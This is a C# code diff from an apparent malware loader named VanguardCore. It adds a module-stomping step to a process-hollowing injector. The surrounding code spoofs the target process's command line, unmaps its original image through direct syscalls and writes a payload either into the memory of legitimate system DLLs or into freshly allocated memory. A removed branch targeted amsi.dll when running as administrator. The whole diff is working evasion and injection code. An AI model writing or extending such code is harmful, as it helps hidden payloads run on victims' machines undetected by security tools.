@@ -68,27 +68,35 @@ namespace VanguardCore
             // [PRO] Apply Command Line Spoofing
             ProcessStealth.SpoofCommandLine(procInfo.hProcess, cmdLine);
 
-            IntPtr remoteBase = IntPtr.Zero;
-            try
-            {
-                SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
-                uint rl; ntQuery(procInfo.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);
+                IntPtr remoteBase = IntPtr.Zero;
+                try
+                {
+                    SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
+                    uint rl; ntQuery(procInfo.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);
 
-                byte[] pebBuf = new byte[8]; IntPtr br;
-                ntRead(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
-                ntUnmap(procInfo.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));
+                    byte[] pebBuf = new byte[8]; IntPtr br;
+                    ntRead(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
+                    ntUnmap(procInfo.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));
 
-                remoteBase = (IntPtr)imageBase;
-                UIntPtr sz = (UIntPtr)sizeOfImage;
-                
-                // [PRO] Module Stomping: Instead of raw allocation, we "stomp" a legitimate DLL
-                string stompDll = "uxtheme.dll";
-                if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) stompDll = "amsi.dll";
-                
-                if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) {
-                    remoteBase = IntPtr.Zero;
-                    if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
-                }
+                    // [PRO] Module Stomping implementation
+                    remoteBase = FindStompModule(procInfo.hProcess, (uint)sizeOfImage);
+                    if (remoteBase == IntPtr.Zero)
+                    {
+                        // Fallback to stealthy allocation if no suitable module found
+                        remoteBase = (IntPtr)imageBase;
+                        UIntPtr szAlloc = (UIntPtr)sizeOfImage;
+                        if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref szAlloc, 0x3000, 0x04) != 0) {
+                            remoteBase = IntPtr.Zero;
+                            if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref szAlloc, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
+                        }
+                    }
+                    else
+                    {
+                        Log($"[PRO] Stomping into module at 0x{remoteBase.ToInt64():X}");
+                        // Change protection of the stomped region to RW for writing
+                        uint old; uint sStomp = (uint)sizeOfImage; IntPtr aStomp = remoteBase;
+                        ntProtect(procInfo.hProcess, ref aStomp, ref sStomp, 0x04, out old); // PAGE_READWRITE
+                    }
 
                 FixImports(payload, lfanew);
                 long delta = (long)remoteBase - imageBase;
@@ -223,6 +231,33 @@ namespace VanguardCore
             List<byte> bytes = new List<byte>();
             while (payload[offset] != 0 && offset < payload.Length) bytes.Add(payload[offset++]);
             return System.Text.Encoding.ASCII.GetString(bytes.ToArray());
+        }
+
+        private static IntPtr FindStompModule(IntPtr hProcess, uint minSize)
+        {
+            try
+            {
+                // We prefer modules that are common but not critical for initial stability
+                // shcore.dll, uxtheme.dll, user32.dll (if large enough)
+                string[] candidates = { "shcore.dll", "uxtheme.dll", "ole32.dll", "shell32.dll" };
+                
+                foreach (string dll in candidates)
+                {
+                    IntPtr hMod = SyscallManager.GetModuleHandle(dll);
+                    if (hMod == IntPtr.Zero) continue;
+
+                    // For Simplicity in NativeAOT, we assume the module is loaded at the same address in target
+                    // This is true for system DLLs due to ASLR being system-wide per boot
+                    
+                    // Verify size
+                    int lfanew = Marshal.ReadInt32(hMod, 0x3C);
+                    int sizeOfImage = Marshal.ReadInt32(hMod, lfanew + 0x50);
+                    
+                    if (sizeOfImage >= minSize) return hMod;
+                }
+            }
+            catch { }
+            return IntPtr.Zero;
         }
 
         [StructLayout(LayoutKind.Sequential)]
